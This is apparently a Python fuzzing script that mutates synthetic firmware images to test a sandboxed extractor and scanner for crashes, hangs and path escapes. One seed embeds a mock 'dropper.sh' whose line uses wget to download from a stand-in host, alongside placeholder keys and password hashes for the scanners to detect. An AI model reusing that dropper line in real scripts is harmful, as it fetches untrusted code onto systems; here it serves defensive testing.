"""End-to-end mutation fuzzing of the sandbox-side analysis (dfa.core.analyze.run): identification, extraction
(nested containers, data after streams and images, executable overlays, carving of raw images) and the built-in
scanners, followed by the worker's checks of the manifest (dfa.sandbox.load_manifest).

Seeds are composite images built here (standard library, tests/factory.py, and mksquashfs/mkfs.cramfs/lzop when
installed). Mutations favour the bytes around each container's header and length fields, and splice in the magics
the extractor looks for. For every input:

- the analysis completes: an exception out of analyze.run loses the whole scan;
- no hang, no MemoryError or crash: each input runs in a forked child with an address-space limit (RLIMIT_AS), as
  the local sandbox runs the analysis, so a leak or a native abort is caught and charged to the input;
- the manifest passes the worker's checks (json.dumps -> load_manifest);
- every artifact path stays inside the work directory and names a regular file;
- nothing in the work directory is a link or a special file, and its size stays within the byte budget.

Container-only unpackers (jefferson, ubireader, fsck.erofs) stay disabled: DFA_IN_SANDBOX is not set. Reproducers
are written to the output directory. Usage (from the repository root; seconds per seed, optional seed names):

    .venv/bin/python scripts/fuzz_extract.py 30 /tmp/fuzz-extract-out [seed ...]

scripts/fuzz_pipeline.py reuses the seeds and mutations for the whole upload -> worker -> reports chain.

Found so far: every lzop artifact leaked 448 KiB of LZO work memory (a few hundred lzop files aborted the analysis
under the local sandbox's address-space limit). Last run (2026-11-05, 150 s per seed): ~306,000 inputs, nothing else.
"""
from __future__ import annotations

import bz2
import contextlib
import gzip
import io
import json
import lzma
import os
import random
import resource
import select
import shutil
import signal
import stat
import struct
import subprocess
import sys
import tarfile
import tempfile
import time
import traceback
import zipfile
import zlib
from collections import Counter
from pathlib import Path
from types import SimpleNamespace

BACKEND = Path(__file__).resolve().parents[1] / "backend"
sys.path[:0] = [str(BACKEND), str(BACKEND / "tests")]
os.environ.pop("DFA_IN_SANDBOX", None)
import factory  # noqa: E402

from dfa.core.analyze import run as analyze  # noqa: E402
from dfa.core.extract import MODULE_SIG_MARKER  # noqa: E402
from dfa.core.limits import Limits  # noqa: E402
from dfa.sandbox import load_manifest  # noqa: E402

CHILD_AS = 2 * 1024**3  # address space each input may add (the local sandbox's default memory limit is 2g)
rng = random.Random(4321)  # noqa: S311 - reproducible mutations, not cryptography
LIMITS = Limits(max_total_bytes=64 * 1024**2, max_file_bytes=32 * 1024**2, max_files=400, tool_timeout_s=20,
                max_scan_bytes_per_file=8 * 1024**2)
SETTINGS = SimpleNamespace(max_manifest_mb=64)
HANG_S = 60  # seconds without a verdict
BATCH = 64  # inputs per forked child
SCRATCH = Path(tempfile.gettempdir()) / "dfa-fuzz-unset"  # set by main()
OUT = Path("fuzz-extract-out")



# ---------------------------------------------------------------------------------------------------- seeds
MAGICS = [b"PK\x03\x04", b"PK\x01\x02", b"PK\x05\x06", b"PK\x06\x06", b"PK\x06\x07", b"7z\xbc\xaf\x27\x1c\x00\x04",
          b"hsqs", b"\x1f\x8b\x08\x00", b"\xfd7zXZ\x00", b"BZh91AY&SY", b"\x5d\x00\x00\x80\x00", b"070701", b"070702",
          b"\xc7\x71", b"\x7fELF\x01\x01\x01", b"\x7fELF\x02\x01\x01", b"-rom1fs-", b"CROM", b"\x27\x05\x19\x56",
          b"\x28\xb5\x2f\xfd", b"\x04\x22\x4d\x18", b"\x02\x21\x4c\x18", b"\x89LZO\x00\r\n\x1a\n", b"ustar\x0000",
          b"ustar  \x00", b"\x45\x3d\xcd\x28", b"Rar!\x1a\x07\x00", b"MSCF\x00\x00\x00\x00", MODULE_SIG_MARKER,
          b"TRAILER!!!\x00", b"\x85\x19", b"UBI#", b"\xe2\xe1\xf5\xe0", b"\x53\xef", b"\xe9\x03\x02\x20",
          b"\xaa\x50\x01\x02", b"{\"magic\": \"PX4FWv1\"", b"\xff" * 64, b"\x00" * 64]
_ALL_MAGICS = (b"PK", b"7z", b"hsqs", b"\x1f\x8b", b"CROM", b"-rom1fs-", b"0707", b"\x7fELF", b"\xfd7zXZ",
               b"\x27\x05\x19\x56", b"BZh", b"\x28\xb5\x2f\xfd", b"\x04\x22\x4d\x18", b"\x02\x21\x4c\x18", b"\x89LZO",
               b"Rar!", b"MSCF", b"\x45\x3d\xcd\x28", b"UBI#", b"\x85\x19", b"\xc7\x71", b"\x5d\x00\x00", b"ustar")


def noise(n: int) -> bytes:
    data = bytearray(rng.randbytes(n))
    for magic in _ALL_MAGICS:
        data = data.replace(magic, b"\x00" * len(magic))
    return bytes(data)


def tar_of(files: dict[str, bytes], fmt: int = tarfile.GNU_FORMAT) -> bytes:
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w", format=fmt) as tf:
        for name, data in files.items():
            ti = tarfile.TarInfo(name)
            ti.size, ti.mode = len(data), 0o4755 if name.startswith("bin/") else 0o644
            tf.addfile(ti, io.BytesIO(data))
    return b.getvalue()


def zip_of(files: dict[str, bytes], method: int = zipfile.ZIP_DEFLATED) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", method) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return b.getvalue()


def newc(entries: list[tuple[str, bytes, int]]) -> bytes:
    out = b""
    for ino, (name, data, mode) in enumerate(entries + [("TRAILER!!!", b"", 0)], 1):
        raw = name.encode() + b"\0"
        hdr = b"070701" + b"".join(b"%08X" % v for v in (ino, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(raw), 0))
        blob = hdr + raw
        blob += b"\0" * (-len(blob) % 4) + data
        out += blob + b"\0" * (-len(blob) % 4)
    return out


def uimage(payload: bytes, comp: int = 1) -> bytes:
    hdr = bytearray(struct.pack(">IIIIIIIBBBB32s", 0x27051956, 0, 0, len(payload), 0x80008000, 0x80008000,
                                zlib.crc32(payload), 5, 2, 2, comp, b"Linux-5.4.0"))
    struct.pack_into(">I", hdr, 4, zlib.crc32(bytes(hdr)))
    return bytes(hdr) + payload


def sevenz(body_len: int = 300) -> bytes:
    body = noise(body_len)
    fields = struct.pack("<QQI", body_len - 40, 40, zlib.crc32(body[-40:]))
    return b"7z\xbc\xaf\x27\x1c\x00\x04" + struct.pack("<I", zlib.crc32(fields)) + fields + body


def arm_elf(profile: bytes, payload: bytes = b"") -> bytes:
    attrs = b"A" + struct.pack("<I", 17) + b"aeabi\x00" + b"\x01" + struct.pack("<I", 7) + b"\x07" + profile
    shstr = b"\x00.ARM.attributes\x00.shstrtab\x00"
    code = bytes(range(256))
    code_off, attr_off = 52 + 32, 52 + 32 + 256
    str_off = attr_off + len(attrs)
    sh_off = (str_off + len(shstr) + 3) & ~3
    eh = b"\x7fELF\x01\x01\x01" + b"\x00" * 9 + struct.pack("<HHIIIIIHHHHHH", 2, 40, 1, 0x08000000, 52, sh_off,
                                                              0x05000000, 52, 32, 1, 40, 3, 2)
    ph = struct.pack("<IIIIIIII", 1, code_off, 0x08000000, 0x08000000, 256, 256, 5, 4)
    body = eh + ph + code + attrs + shstr
    body += b"\x00" * (sh_off - len(body))
    return body + b"\x00" * 40 + struct.pack("<IIIIIIIIII", 1, 0x70000003, 0, 0, attr_off, len(attrs), 0, 0, 1, 0) \
        + struct.pack("<IIIIIIIIII", 17, 3, 0, 0, str_off, len(shstr), 0, 0, 1, 0) + payload


KEY = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA" + b"A" * 64 + b"\n-----END RSA PRIVATE KEY-----\n"
ROOTFS = {"etc/shadow": b"root:$1$abc$DEFghijklmnopqrstuv12/:19000:0:99999:7:::\n",
          "etc/os-release": b'ID=debian\nVERSION_ID="12"\n', "etc/ssl/server.key": KEY,
          "bin/busybox": b"BusyBox v1.30.1 (2020-01-01) multi-call binary\x00" + noise(2000)}


def _tool(cmd: list[str], **kw) -> bool:
    if not shutil.which(cmd[0]):
        return False
    return subprocess.run(cmd, capture_output=True, check=False, **kw).returncode == 0


def build_seeds(tmp: Path) -> dict[str, tuple[bytes, list[int]]]:
    """name -> (data, offsets of headers and length fields the mutations should favour)."""
    seeds: dict[str, tuple[bytes, list[int]]] = {}
    tree = tmp / "tree"
    for rel, data in ROOTFS.items():
        (tree / rel).parent.mkdir(parents=True, exist_ok=True)
        (tree / rel).write_bytes(data)

    t1, t2 = tar_of(ROOTFS), tar_of({"etc/config/network": b"option ipaddr 192.168.1.1\n", "etc/dropbear/k": KEY})
    gz = gzip.compress(b"config\n" * 50, mtime=0)
    seeds["tar_concat"] = (t1 + t2 + b"\xff" * 2048 + gz, [0, 512, len(t1) - 1024, len(t1), len(t1) + len(t2)])

    g1, x1 = gzip.compress(t1, mtime=0), lzma.compress(t2)
    b1 = bz2.compress(KEY * 3)
    data = g1 + b"\xff" * 3000 + x1 + b"\x00" * 100 + b1 + noise(300)
    seeds["gz_xz_bz2_trailing"] = (data, [0, len(g1) - 8, len(g1) + 3000, len(g1) + 3000 + len(x1) - 12,
                                          len(g1) + 3100 + len(x1)])

    parts, hot = [noise(8192)], []
    def add(blob: bytes, *rel: int) -> None:
        off = sum(len(p) for p in parts)
        hot.extend([off] + [off + r for r in rel])
        parts.append(blob)
        parts.append(noise(rng.randrange(256, 2048)))
    add(gzip.compress(t1, mtime=0))
    z = zip_of({"a/fw.bin.gz": gzip.compress(b"nested\n" * 20, mtime=0), "etc/shadow": ROOTFS["etc/shadow"]})
    add(z, len(z) - 22, z.rfind(b"PK\x01\x02"))
    add(zip_of({"stored.tar": t2}, zipfile.ZIP_STORED))
    add(sevenz())
    add(newc([("etc/passwd", b"root::0:0::/root:/bin/sh\n", 0o100644), ("bin/su", b"\x7fELF", 0o104755)]))
    add(factory.romfs({"rcS": b"echo hello\n", "key": KEY}))
    add(lzma.compress(KEY, format=lzma.FORMAT_XZ))
    add(factory.cromfs({"rcS": b"param set SYS_AUTOSTART 4001\n"}))
    add(uimage(gzip.compress(b"Linux version 5.4.0\x00" * 20, mtime=0)))
    seeds["raw_flash"] = (b"".join(parts), hot)

    elf = arm_elf(b"A")
    overlay = zip_of({"payload/dropper.sh": b"#!/bin/sh\nwget http://example.test/x\n", "k": KEY})
    seeds["elf_overlay"] = (elf + overlay, [0, 28, 32, 46, 48, len(elf) - 80, len(elf), len(elf) + len(overlay) - 22])
    mcu = arm_elf(b"M", gzip.compress(tar_of({"etc/ssl/k": KEY}), mtime=0) + MODULE_SIG_MARKER)
    seeds["mcu_elf_marker"] = (mcu, [0, 32, len(mcu) - len(MODULE_SIG_MARKER) - 12, len(mcu) - 28])

    kernel = uimage(gzip.compress(b"Linux version 5.4.0\x00" * 200, mtime=0))
    sq = tmp / "root.squashfs"
    if _tool(["mksquashfs", str(tree), str(sq), "-noappend", "-quiet"]):
        rootfs = sq.read_bytes()
    else:
        rootfs = factory.romfs({"rcS": b"echo\n", "key": KEY})
    img = kernel + b"\xff" * (-len(kernel) % 65536)
    rofs = len(img)
    img += rootfs + b"\xff" * (-len(rootfs) % 65536)
    over = len(img)
    img += gzip.compress(t2, mtime=0) + b"\xff" * 1024
    seeds["sysupgrade"] = (img, [0, 12, 64, rofs, rofs + 40, rofs + len(rootfs) - 8, over])

    early = newc([("kernel/x86/microcode/GenuineIntel.bin", b"ucode", 0o100644)])
    main = newc([("etc/passwd", b"root::0:0::/root:/bin/sh\n", 0o100644), ("init", b"#!/bin/sh\n", 0o100755),
                 ("bin/su", b"\x7fELF\x01" + noise(200), 0o104755)])
    gm = gzip.compress(main, mtime=0)
    seeds["initramfs"] = (early + gm + tar_of({"etc/k": KEY}),
                          [0, 6, 54, 94, len(early) - 120, len(early), len(early) + len(gm)])

    crom = factory.cromfs({"rcS": b"param set SYS_AUTOSTART 4001\n", "rc.mc": b"ekf2 start\n" * 30})
    rom = factory.romfs({"rcS": b"echo hello\n"})
    seeds["cromfs_romfs_trailing"] = (crom + b"\xff" * 512 + rom + gzip.compress(KEY, mtime=0),
                                      [0, 4, 8, 12, 20, 40, 60, len(crom), len(crom) + 512, len(crom) + 512 + 8,
                                       len(crom) + 512 + len(rom)])

    px4 = factory.px4_container(tmp / "fw.px4").read_bytes()
    seeds["px4"] = (px4, [0, px4.find(b'"image"'), px4.find(b'"image_size"'), len(px4) - 40])

    app = factory.esp_image([(0x3F400020, factory.esp_app_desc("blink", "v1.0", "v5.1") + b"\x00" * 256),
                             (0x40080000, factory.xtensa_code(64))], chip_id=0, hash_appended=True)
    boot = factory.esp_image([(0x40078000, factory.xtensa_code(32))], chip_id=0)
    table = factory.esp_partition_table([("nvs", 1, 2, 0x9000, 0x6000, 0), ("factory", 0, 0, 0x10000, 0x10000, 0),
                                         ("storage", 1, 0x82, 0x20000, 0x8000, 0)])
    dump = bytearray(factory.esp_flash_dump(boot, table, {0x10000: app}, size=0x28000))
    spiffs = gzip.compress(tar_of({"cfg/wifi.txt": b"psk=hunter2\n"}), mtime=0)
    dump[0x20000:0x20000 + len(spiffs)] = spiffs
    seeds["esp_flash"] = (bytes(dump), [0x1000, 0x1008, 0x8000, 0x8020, 0x8040, 0x8060, 0x10000, 0x10008, 0x20000])

    vendor = b"VNDRHDR1" + struct.pack("<II", 1, 64) + b"\x00" * 48
    inner = zip_of({"update/rootfs.tar.gz": gzip.compress(t1, mtime=0), "update/nested.zip":
                    zip_of({"x/k": KEY}, zipfile.ZIP_STORED), "update/manifest.json": b'{"version": "1.2.3"}'})
    seeds["zip_prefixed"] = (vendor + inner, [0, 64, 64 + 30, 64 + len(inner) - 22, 64 + inner.rfind(b"PK\x01\x02")])

    import lz4.block
    import lz4.frame
    import zstandard
    legacy = b"\x02\x21\x4c\x18"
    blk = lz4.block.compress(t1, store_size=False)
    legacy += struct.pack("<I", len(blk)) + blk + struct.pack("<I", len(t1))
    zs = zstandard.ZstdCompressor().compress(t2)
    lf = lz4.frame.compress(gzip.compress(KEY, mtime=0))
    seeds["lz4_zstd"] = (legacy + b"\xff" * 64 + zs + lf, [0, 4, len(legacy) - 4, len(legacy) + 64,
                                                           len(legacy) + 64 + len(zs)])

    lzo_in = tmp / "fw.tar"
    lzo_in.write_bytes(t1)
    if _tool(["lzop", "-q", "-f", str(lzo_in)]):
        lz = (tmp / "fw.tar.lzo").read_bytes()
        seeds["lzop_trailing"] = (lz + b"\x00" * 4096 + zip_of({"k": KEY}), [0, 9, 30, 50, len(lz) - 4, len(lz)])

    cram = tmp / "root.cramfs"
    if _tool(["mkfs.cramfs", str(tree), str(cram)]):
        c = cram.read_bytes()
        seeds["cramfs_trailing"] = (c + b"\xff" * 4096 + gzip.compress(KEY, mtime=0), [0, 4, 8, 16, 32, 48, 64, len(c)])

    ext = tmp / "root.ext4"
    if _tool(["mkfs.ext4", "-q", "-F", "-d", str(tree), "-b", "1024", str(ext), "256"]):
        e = ext.read_bytes()
        seeds["ext4"] = (e, [1024, 1024 + 4, 1024 + 24, 1024 + 32, 1024 + 40, 1024 + 88, 2048, 1024 * 5])
    return seeds


# ---------------------------------------------------------------------------------------------------- mutation
INTERESTING32 = [0, 1, 2, 7, 8, 16, 20, 32, 0x7F, 0x80, 0xFF, 0x100, 0x1000, 0xFFFF, 0x10000, 0x7FFFFFFF,
                 0x80000000, 0xFFFFFFFE, 0xFFFFFFFF]


def mutate(data: bytes, hot: list[int]) -> bytes:
    b = bytearray(data)
    for _ in range(rng.randint(1, 4)):
        if not b:
            b = bytearray(rng.randbytes(64))
        if hot and rng.random() < 0.7:
            i = min(max(rng.choice(hot) + rng.randint(-16, 64), 0), len(b) - 1)
        else:
            i = rng.randrange(len(b))
        op = rng.random()
        v = rng.choice(INTERESTING32 + [len(b), len(b) - i, len(b) + 1, rng.randrange(0, len(b) + 4096)])
        if op < 0.25:
            b[i] ^= 1 << rng.randrange(8)
        elif op < 0.35:
            b[i] = rng.choice([0, 0xFF, 0x7F, 0x80, 0x20, 0x2F, 0x2E])
        elif op < 0.55:
            fmt = rng.choice(["<I", ">I", "<H", ">H", "<Q"])
            n = struct.calcsize(fmt)
            b[i:i + n] = struct.pack(fmt, v & ((1 << (8 * n)) - 1))
        elif op < 0.62:  # cpio newc and tar headers are hex / octal text
            b[i:i + 8] = b"%08X" % (v & 0xFFFFFFFF) if rng.random() < 0.5 else b"%07o\x00" % (v & 0o7777777)
        elif op < 0.72:
            m = rng.choice(MAGICS)
            b[i:i + len(m)] = m
        elif op < 0.8:
            b = b[:i]
        elif op < 0.88:  # duplicate a chunk (shifts everything after it)
            j = rng.randrange(len(b))
            b[i:i] = b[j:j + rng.randint(1, 512)]
        elif op < 0.94:
            del b[i:i + rng.randint(1, 512)]
        else:
            b += rng.choice([b"\xff" * rng.randint(1, 8192), b"\x00" * rng.randint(1, 8192), noise(rng.randint(1, 600)),
                             bytes(b[: rng.randint(1, 4096)])])
    return bytes(b)


# ---------------------------------------------------------------------------------------------------- checks
def _rmtree(p: Path) -> None:
    for dirpath, dirnames, _ in os.walk(p):
        for d in dirnames:
            with contextlib.suppress(OSError):
                os.chmod(os.path.join(dirpath, d), 0o700, follow_symlinks=False)
    shutil.rmtree(p, ignore_errors=True)


def check(work: Path, manifest: dict) -> list[str]:
    problems: list[str] = []
    total = 0
    for dirpath, dirnames, filenames in os.walk(work):
        for n in dirnames + filenames:
            st = os.lstat(os.path.join(dirpath, n))
            if stat.S_ISLNK(st.st_mode) or not (stat.S_ISREG(st.st_mode) or stat.S_ISDIR(st.st_mode)):
                problems.append(f"link/special in work dir: {os.path.join(dirpath, n)[len(str(work)):]}")
            elif stat.S_ISREG(st.st_mode):
                total += st.st_size
    if total > LIMITS.max_total_bytes * 2 + 16 * 1024**2:
        problems.append(f"work dir holds {total} bytes")
    (work / "manifest.json").write_text(json.dumps(manifest, indent=1, default=str))
    try:
        loaded = load_manifest(work, "manifest.json", SETTINGS)
    except Exception as exc:  # noqa: BLE001
        return problems + [f"worker rejects manifest: {type(exc).__name__}: {str(exc)[:200]}"]
    if "fatal_error" in loaded:
        return problems + [f"fatal error: {loaded['fatal_error'][:200]}"]
    base = work.resolve()
    for a in loaded["extraction"]["artifacts"]:
        if a["path"] == "<input>":
            continue
        p = (work / a["path"])
        if not str(p.resolve()).startswith(str(base) + os.sep):
            problems.append(f"artifact path outside work dir: {a['path']!r}")
        elif not p.is_file() or p.is_symlink():
            problems.append(f"artifact path is not a regular file: {a['path']!r}")
    if len(loaded["extraction"]["artifacts"]) > LIMITS.max_files + 50:
        problems.append(f"{len(loaded['extraction']['artifacts'])} artifacts")
    return problems


FAILED: list[str] = []


def _vmsize() -> int:
    with open("/proc/self/status") as f:
        return next(int(ln.split()[1]) * 1024 for ln in f if ln.startswith("VmSize"))


def _child(name: str, src: Path, work: Path) -> dict:
    try:
        manifest = analyze(src, f"{name}.bin", work, LIMITS)
        problems = check(work, manifest)
        status = manifest["extraction"]["artifacts"][0].get("extraction") or "-"
        if problems:
            return {"key": "problem: " + problems[0].split(":")[0], "detail": "; ".join(problems[:3]), "status": status}
        return {"status": status}
    except MemoryError:
        return {"key": "MemoryError", "detail": ""}
    except Exception as exc:  # noqa: BLE001
        tb = traceback.extract_tb(exc.__traceback__)[-1]
        return {"key": f"{type(exc).__name__} @ {Path(tb.filename).name}:{tb.lineno}", "detail": str(exc)[:200]}


def run_batch(name: str, inputs: list[bytes], first: int) -> list[dict]:
    """Analyse inputs in forked children (fresh address space, like sandbox jobs), up to BATCH per child: a child
    reports one verdict per input; a hang or crash is charged to the first input it did not report, and a new
    child continues after it."""
    paths = [SCRATCH / f"in{first + i}" for i in range(len(inputs))]
    for path, data in zip(paths, inputs, strict=True):
        path.write_bytes(data)
    verdicts: list[dict] = []
    while len(verdicts) < len(paths):
        pos = len(verdicts)
        r, w = os.pipe()
        pid = os.fork()
        if pid == 0:  # child
            os.close(r)
            code = 0
            try:
                limit = _vmsize() + CHILD_AS
                resource.setrlimit(resource.RLIMIT_AS, (limit, limit))
                for j in range(pos, len(paths)):
                    work = SCRATCH / f"w{first + j}"
                    verdict = _child(name, paths[j], work)
                    _rmtree(work)
                    os.write(w, (json.dumps(verdict) + "\n").encode())
            except BaseException:  # noqa: BLE001
                code = 3
            finally:
                os._exit(code)
        os.close(w)
        buf, hung = b"", False
        while len(verdicts) < len(paths):
            ready, _, _ = select.select([r], [], [], HANG_S)
            if not ready:
                os.kill(pid, signal.SIGKILL)
                hung = True
                break
            chunk = os.read(r, 65536)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                verdicts.append(json.loads(line))
        os.close(r)
        _, st = os.waitpid(pid, 0)
        if len(verdicts) < len(paths):  # the child stopped before reporting this input
            if hung:
                verdicts.append({"key": "HANG", "detail": f">{HANG_S}s"})
            elif os.WIFSIGNALED(st):
                verdicts.append({"key": f"CRASH signal {os.WTERMSIG(st)}", "detail": ""})
            else:
                verdicts.append({"key": "no verdict", "detail": f"exit {os.WEXITSTATUS(st)}"})
            _rmtree(SCRATCH / f"w{first + len(verdicts) - 1}")
    for path in paths:
        path.unlink(missing_ok=True)
    return verdicts


def fuzz(name: str, seed: bytes, hot: list[int], seconds: float) -> None:
    start, n, errs, status = time.monotonic(), 0, Counter(), Counter()
    while time.monotonic() - start < seconds:
        inputs = [mutate(seed, hot) if n + i else seed for i in range(BATCH)]
        for i, verdict in enumerate(run_batch(name, inputs, n)):
            if "status" in verdict:
                status[verdict["status"]] += 1
            if key := verdict.get("key"):
                errs[key] += 1
                if errs[key] <= 2:
                    rep = OUT / f"repro_{name}_{len(errs)}_{errs[key]}.bin"
                    rep.write_bytes(inputs[i])
                    print(f"  {name}: {key} ({verdict.get('detail', '')}) -> {rep.name}", flush=True)
        n += len(inputs)
    print(f"{name:22s} {n:6d} inputs, root extraction {dict(status)}, unexpected: {dict(errs) or 'none'}",
          flush=True)
    if errs:
        FAILED.append(name)


def main(argv: list[str]) -> int:
    global SCRATCH, OUT
    budget, OUT, only = float(argv[0]), Path(argv[1]).resolve(), set(argv[2:])
    OUT.mkdir(parents=True, exist_ok=True)
    SCRATCH = Path(tempfile.mkdtemp(prefix="dfa-fuzz-"))
    try:
        seeds = build_seeds(SCRATCH / "seeds")
        for name, (data, hot) in seeds.items():
            if only and name not in only:
                continue
            fuzz(name, data, [h for h in hot if 0 <= h < len(data)], budget)
    finally:
        _rmtree(SCRATCH)
    if FAILED:
        print(f"FAILED: {', '.join(FAILED)} (reproducers in {OUT})")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
